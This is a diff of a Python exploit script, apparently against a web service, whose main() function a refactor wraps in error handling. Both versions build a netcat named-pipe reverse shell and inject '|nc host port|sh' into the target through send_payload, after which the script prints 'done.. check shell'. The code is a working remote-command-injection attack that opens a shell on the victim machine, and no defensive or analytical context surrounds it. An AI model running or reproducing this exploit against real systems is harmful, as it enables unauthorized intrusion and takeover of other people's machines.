@@ -14,11 +14,15 @@ payload_port =3D 81
 
 
 def main():
-    e_proc =3D Popen(["echo", f"rm /tmp/s & mknod /tmp/s p & /bin/sh 0< /tm=
-p/s | nc {lhost} {lport} > /tmp/s"], stdout=3DPIPE)
-    Popen(["nc", "-nlvp", f"{payload_port}"], stdin=3De_proc.stdout)
-    send_payload(f"|nc {lhost} {payload_port}|sh")
-    print("done.. check shell")
+    try:
+        payload_command = f"rm /tmp/s && mknod /tmp/s p && /bin/sh 0< /tmp/s | nc {LOCAL_HOST} {LOCAL_PORT} > /tmp/s"
+        with Popen(["echo", payload_command], stdout=PIPE) as e_proc:
+            Popen(["nc", "-nlvp", f"{PAYLOAD_PORT}"], stdin=e_proc.stdout)
+            send_payload(f"|nc {LOCAL_HOST} {PAYLOAD_PORT}|sh")
+            print("done.. check shell")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
 
 
 def get_session():
